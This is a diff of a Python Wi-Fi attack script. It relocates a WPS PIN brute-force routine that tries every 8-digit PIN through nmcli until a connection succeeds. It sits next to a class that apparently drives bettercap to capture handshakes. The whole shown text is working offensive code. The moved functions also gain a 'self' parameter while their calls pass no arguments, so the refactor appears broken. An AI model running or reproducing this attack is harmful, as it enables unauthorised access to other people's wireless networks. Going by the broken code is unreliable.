@@ -4,45 +4,6 @@ import os
 import subprocess
 import time
 
-def generate():
-    for var in range(0, 100000000):
-        yield f"{var:08d}"  
-
-def connect(ssid, pin):
-    try:
-        result = subprocess.run(
-            ["nmcli", "dev", "wifi", "connect", ssid, "--wps-pin", pin],
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            text=True
-        )
-
-        if "successfully activated" in result.stdout.lower():
-            ui_print(f"Connected'{ssid}' \n PIN: {pin}")
-            return True
-        else:
-            print(f"PIN {pin} fallito.")
-            return False
-    except Exception as e:
-        ui_print(f"Error {pin}:\n {e}")
-        return False
-
-def brute_force_wps(ssid):
-    for pin in generate():
-        if connect(ssid, pin):
-            ui_print(f"PIN : {pin}")
-            break
-        time.sleep(0.1) 
-
-
-
-
-# network_ssid = getinput() 
-# brute_force_wps(network_ssid)
- 
-
-bk_ = 0
-
 class CapHandshakes():
     def __init__(self, INTERFACE):
         self.bettercap_process = subprocess.Popen(
@@ -120,3 +81,43 @@ class CapHandshakes():
                 file.write(self.bettercap_process.stdout.readline())
 
         return 2
+
+#WPS
+def generate(self):
+    for var in range(0, 100000000):
+        yield f"{var:08d}"  
+
+def connect(self, ssid, pin):
+    try:
+        result = subprocess.run(
+            ["nmcli", "dev", "wifi", "connect", ssid, "--wps-pin", pin],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True
+        )
+
+        if "successfully activated" in result.stdout.lower():
+            ui_print(f"Connected'{ssid}' \n PIN: {pin}")
+            return True
+        else:
+            print(f"PIN {pin} fallito.")
+            return False
+    except Exception as e:
+        ui_print(f"Error {pin}:\n {e}")
+        return False
+
+def brute_force_wps(self, ssid):
+    for pin in generate():
+        if connect(ssid, pin):
+            ui_print(f"PIN : {pin}")
+            break
+        time.sleep(0.1) 
+
+
+
+
+# network_ssid = getinput() 
+# brute_force_wps(network_ssid)
+ 
+
+bk_ = 0
